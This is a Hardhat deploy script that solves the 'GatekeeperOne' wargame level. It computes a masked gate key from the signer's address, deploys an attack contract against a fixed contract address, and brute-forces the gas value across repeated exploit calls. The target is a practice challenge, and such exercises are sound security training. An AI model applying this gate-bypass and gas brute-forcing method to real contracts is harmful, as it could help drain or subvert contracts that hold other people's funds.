import { HardhatRuntimeEnvironment } from 'hardhat/types';
import { DeployFunction } from 'hardhat-deploy/types';
import { ethers } from 'hardhat';
import { GatekeeperOneAttack__factory, GatekeeperOne__factory } from '../../typechain-types';

// 


const func:DeployFunction = async function (hre: HardhatRuntimeEnvironment){

    console.log(">>>Attach GatekeeperOne Contract");
    // const GatekeeperOne = await ethers.getContractFactory("GatekeeperOne",(await ethers.getSigners())[0])as GatekeeperOne__factory;
    // const gatekeeperOne = await GatekeeperOne.deploy();
    // await gatekeeperOne.deployed();
    // console.log(`>> Deployed GatekeeperOne at ${gatekeeperOne.address}`);
    // const contractAddress = gatekeeperOne.address;



    const contractAddress = "0x7a81324cbd87b632c533cE67A202b928C20B9442"
    const accountAddress = ((await ethers.getSigners())[0]).address.toLocaleLowerCase();
    const gateKey = "0x"+(BigInt("0xFFFFFFFF0000FFFF".toLocaleLowerCase()) & BigInt("0x"+accountAddress.substring(42-16, 42))).toString(16)
    console.log(gateKey);
    console.log(">>>Deploy GatekeeperOneAttack Contract");
    const GatekeeperOneAttack = await ethers.getContractFactory("GatekeeperOneAttack",(await ethers.getSigners())[0]) as GatekeeperOneAttack__factory;
    const gatekeeperOneAttack = await GatekeeperOneAttack.deploy(contractAddress);
    await gatekeeperOneAttack.deployed()
    console.log(`>> Deployed GatekeeperOneAttack at ${gatekeeperOneAttack.address}`);
    console.log(">>gatekeeperOneAttack.exploit");
    for(var i = 2971; i <= 8191; i++){
        try {
            const exploit = await gatekeeperOneAttack.exploit(gateKey,(800000+i));
            await exploit.wait();
            console.log("***passed with gas:"+(800000+i)+"***");
            break
        } catch (error) {
            console.log(">>>> error:"+i+error);
        }
    }
    console.log("✅ Done");
}

export default func;
func.tags = ['GatekeeperOne'];